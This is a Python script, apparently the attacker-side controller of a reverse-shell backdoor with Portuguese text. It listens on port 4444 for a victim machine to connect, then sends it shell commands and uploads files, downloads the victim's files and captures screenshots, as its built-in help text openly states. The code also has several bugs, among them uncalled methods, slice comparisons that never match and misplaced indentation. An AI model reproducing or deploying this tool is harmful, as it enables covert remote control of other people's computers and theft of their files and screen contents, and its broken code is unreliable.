import socket
import os
import termcolor
import json
from termcolor import colored
import subprocess

def data_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode.rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_arquivo(arquivo):
    arq = open(arquivo, "rb")
    target.send(arq.read())

def download_arq(arquivo):
    arq = open(arquivo, "wb")
    target.settimeout(5)
    chunk = target.recv(1024)

    while chunk:
        arq.write(chunk)
        try:
            chunk = target.recv(1024)
        
        except socket.timeout as a:
            break
    target.settimeout(None)
    arq.close
        

def t_comun():
    count = 0
    while True:
        comando = input("* Shell~%s: " % str(ip))
        data_send(comando)
        if comando == "exit":
            break

        elif comando == "clear":
            os.system("clear")
        
        elif comando [:3] == "cd":
            pass

        elif comando [:6] == "upload":
            upload_arquivo(comando[7:])

        elif comando [:8] == "download":
           download_arq(comando[9:])

        elif comando [: 10] == "print":
            arq = open("print%d" % (count), "wb")
            target.settimeout(5)
            chunk = target.recv(1024)

            while chunk:
                arq.write(chunk)
            try:
                chunk = target.recv(1024)
        
            except socket.timeout as a:
                break
            target.settimeout(None)
            arq.close
            count += 1

        elif comando == "help":

            print(colored('''\n
            clear: Limpa o terminal
            exit: Fecha a conexão com a vitima
            cd + "NomeDoDiretorio": Troca o diretorio da vitima
            upload + "NomeDoArquivo": Envia arquivo para a  maquina da vitima
            download + "NomeDoArquivo":Baixa arquivos da vitima 
            print: Tira print da maquina da vitima                                                     
            help: Ajuda o usuario a uasr os comandos
            '''), "yellow")
        else:
            resposta = data_recv()  
            print(resposta)  

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(("192.168.1.11", 4444))
print(colored('[] Esperando por conexões', "green" ))
socket.listen(5)

target, ip = socket.accept()
print(colored("+ Connectado com: " + str(ip), "green"))
